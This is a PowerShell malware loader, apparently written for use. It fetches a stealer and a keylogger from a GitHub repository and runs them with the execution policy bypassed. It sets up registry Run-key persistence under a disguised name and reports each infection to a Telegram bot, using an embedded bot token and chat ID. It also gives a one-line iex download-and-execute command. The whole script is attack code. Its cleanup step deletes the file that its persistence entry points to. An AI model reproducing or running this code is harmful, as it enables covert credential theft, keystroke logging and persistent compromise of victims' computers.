# Self-contained aggressive payload
# Uses GitHub API to bypass CDN cache
# Execute in PowerShell:
# iex((New-Object Net.WebClient).DownloadString('https://api.github.com/repos/isajarGamer2/stealer-repo/contents/payload_final.ps1'))

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
$chatId = "8445047233"
$tempDir = "$env:TEMP\sysupdate_$(Get-Random -Maximum 9999)"

New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
Set-Location $tempDir

# Download stealer.ps1 from GitHub API (bypasses CDN cache)
$apiUrl = "https://api.github.com/repos/isajarGamer2/stealer-repo/contents/stealer.ps1?ref=main"
try {
    $response = Invoke-WebRequest -Uri $apiUrl -UseBasicParsing -UserAgent "Mozilla/5.0" -ErrorAction Stop
    $json = $response.Content | ConvertFrom-Json
    $stealerBytes = [Convert]::FromBase64String($json.content)
    [System.IO.File]::WriteAllBytes("$tempDir\stealer.ps1", $stealerBytes)
    Write-Host "[+] Downloaded aggressive stealer.ps1" -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to download stealer: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# Also download keylogger.ps1
$keyloggerApiUrl = "https://api.github.com/repos/isajarGamer2/stealer-repo/contents/keylogger.ps1?ref=main"
try {
    $response = Invoke-WebRequest -Uri $keyloggerApiUrl -UseBasicParsing -UserAgent "Mozilla/5.0" -ErrorAction Stop
    $json = $response.Content | ConvertFrom-Json
    $klBytes = [Convert]::FromBase64String($json.content)
    [System.IO.File]::WriteAllBytes("$tempDir\keylogger.ps1", $klBytes)
    Write-Host "[+] Downloaded keylogger.ps1" -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to download keylogger: $($_.Exception.Message)" -ForegroundColor Red
}

# Execute the aggressive stealer
Write-Host "[*] Executing aggressive stealer..." -ForegroundColor Yellow
powershell.exe -ExecutionPolicy Bypass -File "$tempDir\stealer.ps1"

# Execute keylogger in background
Start-Job -ScriptBlock {
    param($path)
    powershell.exe -ExecutionPolicy Bypass -File $path
} -ArgumentList "$tempDir\keylogger.ps1" | Out-Null

# Persistence via registry
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SysUpdate32"
$regValue = "powershell.exe -ExecutionPolicy Bypass -File `"$tempDir\stealer.ps1`""
try {
    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
    Write-Host "[+] Persistence established" -ForegroundColor Green
} catch {}

# Cleanup
Remove-Item "$tempDir\*.ps1" -Force -ErrorAction SilentlyContinue

# SUCCESS
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "           SUCCESS" -ForegroundColor Green -BackgroundColor Black
Write-Host "========================================" -ForegroundColor Green

# Send confirmation to Telegram
try {
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
        chat_id = $chatId
        text = "[+] AGGRESSIVE PAYLOAD EXECUTED on $env:COMPUTERNAME by $env:USERNAME at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    } -ErrorAction Stop | Out-Null
} catch {}

exit
